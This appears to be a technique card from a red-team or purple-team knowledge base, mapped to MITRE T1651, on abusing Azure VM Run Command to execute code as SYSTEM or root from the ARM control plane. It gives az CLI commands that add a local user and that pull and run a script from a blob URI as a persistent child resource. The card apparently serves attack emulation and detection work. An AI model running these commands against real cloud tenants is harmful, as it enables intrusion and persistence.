---
id: azure-vm-runcommand
title: Azure VM Run Command (execute on the guest from ARM)
section: Azure / resource plane (ARM)
phase: Execution
attack:
  tactic: TA0002
  techniques: [T1651]
platform: [cloud]
source: MITRE ATT&CK T1651; APT29 Azure Run Command / AOBO
pair: azure-runcommand-activity
---

The control plane is a shell. With `Microsoft.Compute/virtualMachines/runCommand/action`
(Virtual Machine Contributor and up) you run code *inside* the guest straight from ARM — no
RDP, no SSH, no open port, no OS credential — and the VM agent runs it as **SYSTEM** on
Windows / **root** on Linux. It is exactly the move MITRE cites APT29 for. There are two
paths and they log differently, so know both: `run-command invoke` is fire-and-forget with
the script inline in the ARM request, while the **managed** `run-command create` deploys a
persistent `runCommands` **child resource** on the VM and can pull its script from a SAS
blob URI (`--script-uri`) — so the payload never appears in the request body — and can drop
privileges to a chosen local user with `--run-as-user`. The child resource is also a
persistence foothold: it survives until someone deletes it. (Cloud — no on-host target, so
no slots.)

```sh
# action Run Command — fire-and-forget, script inline in the ARM request
az vm run-command invoke -g <rg> -n <vm> --command-id RunPowerShellScript \
  --scripts 'whoami; net user <pwn-user> <pwn-pass> /add'
# managed Run Command — persists as a runCommands child resource; script pulled from a SAS blob
az vm run-command create -g <rg> --vm-name <vm> --name <rc-name> \
  --script-uri '<blob-sas-uri>' --run-as-user <local-user>
```
